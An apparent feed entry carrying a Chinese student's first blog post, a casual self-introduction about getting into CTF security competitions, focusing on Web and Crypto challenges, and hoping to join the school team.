&lt;p&gt;大一摆烂仔（不提也罢），于大一的暑假前一两个月开始接触网络安全（本身专业网络工程，acm连cf都打不明白，没那个天赋和本事，还是CTF收留我）（又是一条不归路），暑假留校学习正式启动我的CTF生涯，学了点鸡毛蒜皮（还是太菜啦），几乎以个人之姿拿下校赛二等奖（还是好水啊）&lt;/p&gt;
&lt;p&gt;目前，学习方向是Web（当时好入门，确实，但也比较难精进），Crypto（大二有相关课程，而且个人觉得挺有意思的，也能摸出不少题），偶尔的Misc手，我Web还是好菜，得多下功夫，不然跟不上我佬Qanux（同级Pwn爹好吧）的步伐了QWQ&lt;/p&gt;
&lt;p&gt;博客去年11月就搭好了，期末开始摆烂，时隔三个月（过年抽空）写下这第一篇blog&lt;/p&gt;
&lt;p&gt;同专业找不到人（?），然后喜欢一个人打比赛（bushi，没找人，懒，暂时没去打开这个圈子），希望今后认识些大佬，然后争取线下单杀（）&lt;/p&gt;
&lt;p&gt;正在猥琐发育（大佬原话）的&lt;strong&gt;Web手HvAng&lt;/strong&gt;，争取寒假回校后进入校队，认真努力搞好我的Web，拿点奖，干点CTF之外的事情，为将来进军网安领域打点基础（感jio有点天真）&lt;/p&gt;
&lt;p&gt;不管了，大学四年总得搞好一些事情吧，一件也好（挺认同大佬这句话的）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;未完待续……&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
</feed>
